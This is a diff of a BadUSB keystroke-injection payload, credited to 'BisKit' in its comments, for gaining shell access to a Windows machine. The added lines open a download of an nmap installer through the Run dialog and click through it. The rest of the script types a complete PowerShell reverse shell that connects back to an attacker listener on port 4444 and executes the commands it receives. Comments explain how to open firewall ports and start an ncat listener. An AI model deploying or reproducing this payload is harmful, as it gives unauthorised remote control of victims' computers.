@@ -1,11 +1,42 @@
 REM shell access to any windows machine badusb, use ncat to get remote access also install sudo ufw and run the command sudo ufw allow 9001 or you can do port 4444 so first run nc -lnvp 4444 or nc -lnvp 9001
 REM then run the bad usb payload onto the targets windows machine 
 REM made by BisKit
-DELAY 120
+WINDOWS r
+DELAY 215
+STRING https://nmap.org/dist/nmap-7.95-setup.exe
+ENTER
+DELAY 3900
+ALT F4
+DELAY 625
+WINDOWS r
+DELAY 225
+STRING powershell
+ENTER
+DELAY 500
+STRING cd Downloads
+ENTER
+DELAY 2725
+STRING start nmap-7.95-setup.exe
+DELAY 35
+LEFT ARROW
+GUI LEFT ARROW
+DELAY 55
+ENTER
+DELAY 325
+ENTER
+DELAY 725
+ENTER
+DELAY 825
+ENTER
+DELAY 1480
+ENTER
+DELAY 725
+ENTER
+DELAY 6050
 WINDOWS r
 DELAY 94
 STRING powershell
 ENTER
 DELAY 895
 STRING $LHOST = "192.168.1.141"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
-ENTER
+ENTER 
